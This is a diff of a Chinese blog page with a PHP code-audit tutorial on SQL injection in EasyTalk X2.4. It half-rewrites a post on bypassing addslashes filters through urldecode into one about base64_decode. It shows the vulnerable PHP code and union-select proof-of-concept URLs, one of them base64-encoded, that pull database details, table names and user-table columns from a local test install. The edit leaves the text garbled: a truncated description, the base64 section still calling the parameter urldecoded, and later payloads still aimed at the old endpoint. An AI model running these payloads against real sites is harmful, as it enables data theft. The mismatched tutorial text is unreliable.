@@ -59,25 +59,25 @@
 
 
 
-<meta name="description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲urldecode()的情况，同样大牛请自觉绕道~">
+<meta name="description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode">
-<meta property="og:url" content="http://www.cnbraid.com/2015/12/24/sql1/index.html">
+<meta property="og:title" content="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode">
+<meta property="og:url" content="http://www.cnbraid.com/2015/01/12/sql2/index.html">
 <meta property="og:site_name" content="Braid's Blog">
-<meta property="og:description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲urldecode()的情况，同样大牛请自觉绕道~">
+<meta property="og:description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_4.png">
-<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_7.png">
+<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg">
+<meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_8.png">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_9.png">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_10.png">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_11.png">
-<meta property="og:updated_time" content="2016-01-04T10:03:08.198Z">
+<meta property="og:updated_time" content="2016-01-12T06:03:13.813Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode">
-<meta name="twitter:description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲urldecode()的情况，同样大牛请自觉绕道~">
+<meta name="twitter:title" content="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode">
+<meta name="twitter:description" content="0x01 背景现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~">
 
 
 
@@ -95,7 +95,7 @@
   };
 </script>
 
-  <title> 【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode | Braid's Blog </title>
+  <title> 【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode | Braid's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -233,7 +233,7 @@
             
             
               
-                【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode
+                【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode
               
             
           </h1>
@@ -245,8 +245,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-12-24T10:35:00+08:00" content="2015-12-24">
-              2015-12-24
+            <time itemprop="dateCreated" datetime="2015-01-12T10:35:00+08:00" content="2015-01-12">
+              2015-01-12
             </time>
           </span>
 
@@ -275,8 +275,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2015/12/24/sql1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/24/sql1/" itemprop="commentsCount"></span>
+                <a href="/2015/01/12/sql2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/01/12/sql2/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -286,7 +286,7 @@
 
           
           
-             <span id="/2015/12/24/sql1/" class="leancloud_visitors" data-flag-title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode">
+             <span id="/2015/01/12/sql2/" class="leancloud_visitors" data-flag-title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -306,7 +306,7 @@
       
 
       
-        <h2 id="0x01_背景">0x01 背景</h2><p>现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲urldecode()的情况，同样大牛请自觉绕道~<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png" alt=""><br><a id="more"></a></p>
+        <h2 id="0x01_背景">0x01 背景</h2><p>现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。base64decode()的情况，同样大牛请自觉绕道~<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png" alt=""><br><a id="more"></a></p>
 <h2 id="0x02_环境搭建">0x02 环境搭建</h2><p>看背景我们使用了低版本的easytalk程序，版本为X2.4<br>①源码我打包了一份：<a href="http://pan.baidu.com/s/1bopOFNL" title="easytalk.zip" target="_blank" rel="external">http://pan.baidu.com/s/1bopOFNL</a><br>②解压到www的easytalk目录下，按照提示一步步安装即可，遇到问题自行百度或谷歌，成功后访问如下图：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png" alt=""></p>
 <h2 id="0x03_漏洞分析">0x03 漏洞分析</h2><p>首先看下源码结构，用的ThinkPHP框架，比较复杂：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png" alt=""><br>有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：<br>1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行：</p>
 <pre><code>/**
@@ -326,40 +326,27 @@ static public <span class="keyword">function</span> addSlashes(<span class="vari
     }
     return <span class="variable">$string</span>;
 }    
-</code></pre><p>2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”urldecode”的文件，发现TopicAction.class.php包含一个对接收的参数keyword进行urldecode的地方：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_4.png" alt=""><br>3.我们跟进这个php文件，发现接收keyword就对其进行urldecode转码，然后立即带入查询，造成注入：</p>
-<pre><code>public <span class="keyword">function</span> topic() {
-    <span class="variable">$keyword</span>=<span class="variable">$this-</span>&gt;_get(<span class="string">'keyword'</span>,<span class="string">'urldecode'</span>);//这里对get接收的keyword参数进行urldecode
-    if (<span class="variable">$keyword</span>) {
-        <span class="variable">$topic</span> = D(<span class="string">'Topic'</span>)-&gt;where(<span class="string">"topicname='$keyword'"</span>)-&gt;find();//ok，带入查询了
-        if (<span class="variable">$topic</span>) {
-            <span class="variable">$isfollow</span>=D(<span class="string">'Mytopic'</span>)-&gt;isfollow(<span class="variable">$topic</span>[<span class="string">'id'</span>],<span class="variable">$this-</span>&gt;my[<span class="string">'user_id'</span>]);
-            <span class="variable">$topicusers</span>=D(<span class="string">'MytopicView'</span>)-&gt;where(<span class="string">"topicid='$topic[id]'"</span>)-&gt;order(<span class="string">'id desc'</span>)-&gt;limit(<span class="number">9</span>)-&gt;select();
-            //getwidget
-            <span class="variable">$widget</span>=M(<span class="string">'Topicwidget'</span>)-&gt;where(<span class="string">"topicid='$topic[id]'"</span>)-&gt;order(<span class="string">'`order` ASC'</span>)-&gt;select();
-            if (<span class="variable">$widget</span>) {
-                foreach (<span class="variable">$widget</span> as <span class="variable">$val</span>) {
-                    <span class="variable">$topicwidget</span>[<span class="variable">$val</span>[<span class="string">'widgettype'</span>]][]=<span class="variable">$val</span>;
-                }
-            }
-            <span class="variable">$this-</span>&gt;assign(<span class="string">'topicwidget'</span>,<span class="variable">$topicwidget</span>);
-        } else {
-            <span class="variable">$count</span>=<span class="variable">$isfollow</span>=<span class="number">0</span>;
-        }
+</code></pre><p>2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”base64_decode”的文件，发现SettingAction.class.php包含一个对接收的参数keyword进行urldecode的地方：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_04.jpg" alt=""><br>3.我们跟进这个php文件，发现虽然使用daddslashes函数进行了注入过滤，但是使用了base64_decode函数对参数auth进行了转码从而可以绕过过滤造成注入：</p>
+<pre><code>//认证电子邮件
+public <span class="keyword">function</span> doauth() {
+    $_authmsg=daddslashes($_GET[<span class="string">'auth'</span>]);//再次判断GPC是否开始并进行注入过滤
+    <span class="variable">$authmsg</span>=base64_decode($_authmsg);//base64_decode函数对参数进行转码处理
+    <span class="variable">$tem</span>=explode(<span class="string">":"</span>,<span class="variable">$authmsg</span>);//对解码后的参数authmsg按照“：”进行分割存入数组tem中
+    <span class="variable">$send</span>_id=<span class="variable">$tem</span>[<span class="number">0</span>];
+    <span class="variable">$user</span>=M(<span class="string">'Users'</span>);
 
-        <span class="variable">$this-</span>&gt;assign(<span class="string">'comefrom'</span>,<span class="string">'topic'</span>);
-        <span class="variable">$this-</span>&gt;assign(<span class="string">'keyword'</span>,<span class="variable">$keyword</span>);
-        <span class="variable">$this-</span>&gt;assign(<span class="string">'topic'</span>,<span class="variable">$topic</span>);
-        <span class="variable">$this-</span>&gt;assign(<span class="string">'topicusers'</span>,<span class="variable">$topicusers</span>);
-        <span class="variable">$this-</span>&gt;assign(<span class="string">'isfollow'</span>,<span class="variable">$isfollow</span>);
-        <span class="variable">$this-</span>&gt;assign(<span class="string">'subname'</span>,<span class="string">'#'</span>.<span class="variable">$keyword</span>.<span class="string">'#'</span>);
-        <span class="variable">$this-</span>&gt;display();
+    <span class="variable">$row</span> = <span class="variable">$user-</span>&gt;field(<span class="string">'mailadres,auth_email'</span>)-&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;find();//带入查询，在where子句里，造成注入
+    if ($_authmsg==<span class="variable">$row</span>[<span class="string">'auth_email'</span>]) {
+        <span class="variable">$user-</span>&gt;where(<span class="string">"user_id='$send_id'"</span>)-&gt;setField(<span class="string">'auth_email'</span>,<span class="number">1</span>);
+        setcookie(<span class="string">'setok'</span>, json_encode(array(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail6'</span>),<span class="string">'ico'</span>=&gt;<span class="number">1</span>)),<span class="number">0</span>,<span class="string">'/'</span>);
     } else {
-        header(<span class="string">"location:"</span>.SITE_URL.<span class="string">'/?m=topic&amp;a=index'</span>);
+        setcookie(<span class="string">'setok'</span>, json_encode(array(<span class="string">'lang'</span>=&gt;L(<span class="string">'mail7'</span>),<span class="string">'ico'</span>=&gt;<span class="number">2</span>)),<span class="number">0</span>,<span class="string">'/'</span>);
     }
+    header(<span class="string">'location:'</span>.SITE_URL.<span class="string">'/?m=setting&amp;a=mailauth'</span>);
 }
 </code></pre><h2 id="0x04_漏洞证明">0x04 漏洞证明</h2><p>1.我们构造获取数据库相关信息的POC：</p>
-<pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//localhost/eazytalk/?m=topic&amp;a=topic&amp;keyword=aaa%<span class="number">2527</span> and <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="function">concat</span>(<span class="function">database</span>(),<span class="number">0</span>x5c,<span class="function">user</span>(),<span class="number">0</span>x5c,<span class="function">version</span>()),<span class="number">5</span> %<span class="number">23</span></span></span>
-</code></pre><p>成功获取到信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_7.png" alt=""><br>查看下MySql日志，发现成功执行了sql语句：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_8.png" alt=""><br>2.我们构造获取数据库eazytalk所有表的POC：</p>
+<pre><code><span class="string">http:</span><span class="comment">//localhost/eazytalk/?m=setting&amp;a=doauth&amp;auth=aGFja2luZycgdW5pb24gc2VsZWN0IHVzZXIoKSwyIw==</span>
+</code></pre><p>查看sql语句发现成功执行：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql02_05.jpg" alt=""><br>但是不能进一步了。。。。<br>查看下MySql日志，发现成功执行了sql语句：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_8.png" alt=""><br>2.我们构造获取数据库eazytalk所有表的POC：</p>
 <pre><code><span class="keyword">http</span>://localhost/eazytalk/?m=topic&amp;<span class="operator">a</span>=topic&amp;keyword=aaa%<span class="number">2527</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, (select GROUP_CONCAT(DISTINCT table_name) <span class="built_in">from</span> information_schema.tables where table_schema=<span class="number">0x6561737974616C6B</span>),<span class="number">5</span>%<span class="number">23</span>
 </code></pre><p>成功获取所有表信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_9.png" alt=""><br>4.构造获取表et_users所有字段信息的POC：</p>
 <pre><code><span class="keyword">http</span>://localhost/eazytalk/?m=topic&amp;<span class="operator">a</span>=topic&amp;keyword=aaa%<span class="number">2527</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, (select GROUP_CONCAT(DISTINCT column_name) <span class="built_in">from</span> information_schema.columns where table_name=<span class="number">0x65745F7573657273</span>),<span class="number">5</span>%<span class="number">23</span>
@@ -388,13 +375,13 @@ static public <span class="keyword">function</span> addSlashes(<span class="vari
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/12/17/sql0/" rel="next" title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 1.什么都没过滤的入门情况">
-                <i class="fa fa-chevron-left"></i> 【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 1.什么都没过滤的入门情况
-              </a>
-            
           </div>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/01/12/sql2-1/" rel="prev" title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode">
+                【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -420,8 +407,8 @@ static public <span class="keyword">function</span> addSlashes(<span class="vari
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2015/12/24/sql1/"
-           data-title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode" data-url="http://www.cnbraid.com/2015/12/24/sql1/">
+      <div class="ds-thread" data-thread-key="2015/01/12/sql2/"
+           data-title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之Base64Decode" data-url="http://www.cnbraid.com/2015/01/12/sql2/">
       </div>
     
   </div>
